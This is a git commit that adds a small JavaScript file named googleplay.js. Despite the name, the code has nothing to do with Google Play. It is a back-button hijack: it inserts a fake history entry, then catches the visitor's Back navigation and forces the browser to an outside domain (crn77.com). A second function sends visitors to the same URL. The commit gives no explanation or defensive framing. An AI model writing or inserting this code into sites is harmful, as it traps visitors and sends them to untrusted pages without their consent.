355870f42f0fe54ed25e808b26273610351eef87
zebraboiz6 <hopping-font8s@icloud.com>
2026-08-08 11:16:42 +0100

    Create googleplay.js

---
+++ googleplay.js
@@ -0,0 +1,12 @@
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://crn77.com/4/8525379";
+    }
+    function goon(){
+        location.href="https://crn77.com/4/8525379";
+    }
